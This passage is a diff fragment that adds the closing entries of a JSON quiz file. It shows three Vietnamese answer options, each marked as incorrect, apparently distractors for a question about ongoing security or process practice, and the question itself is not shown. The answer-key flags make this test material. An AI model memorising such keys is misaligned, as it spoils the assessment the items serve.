+			{
+				"answer_text": "Giải pháp một lần là đủ",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ cần cài đặt công cụ",
+				"is_correct": false
+			},
+			{
+				"answer_text": "Chỉ phụ thuộc công nghệ",
+				"is_correct": false
+			}
+		]
+	}
+]
